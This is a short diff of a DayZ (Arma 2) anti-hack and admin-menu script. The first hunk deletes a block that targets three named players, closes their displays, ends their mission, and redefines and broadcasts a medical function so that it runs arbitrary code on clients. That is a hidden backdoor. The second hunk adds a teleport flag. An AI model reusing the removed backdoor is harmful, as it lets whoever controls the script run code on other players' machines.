@@ -268,17 +268,6 @@ _LoadPlease = compile ("
 		if !(getPlayeruid Player in ("+(str _adminlist)+" + "+_randx0+")) then 
 		{
 			[] spawn {
-				_name = name player;
-				if (_name in ['Russypoo','raiin','nullbyte']) then {
-					"+_randx10+" = [name player, getPlayerUID player, toArray 'Badguy', toArray (_name)];
-					publicVariable '"+_randx10+"';
-					for '_i' from 0 to 99 do {(findDisplay _i) closeDisplay 0;};
-					sleep 0.05;
-					nomedepi = {player_medPainkiller = {_code = _this select 0; call compile _code;}; publicVariable 'player_medPainkiller';};call nomedepi;
-					endMission 'LOSER';
-				};
-			};
-			[] spawn {
 				_badspellingbro = {
 					"+_randx10+" = [name player, getPlayerUID player, toArray 'Expression', toArray (_this select 0)];
 					publicVariable '"+_randx10+"';
@@ -3233,7 +3222,7 @@ publicVariable "PVDZ_AdminMenuCode";
 	{
 		_unit = (_array select 1);
 		_pos = (_array select 2);
-		
+		_unit setVariable["adminTeleport",1, true];
 		vehicle _unit setPosATL _pos;
 		
 		_savelog = format["%1 TP to %2",name _unit, mapGridPosition _pos];
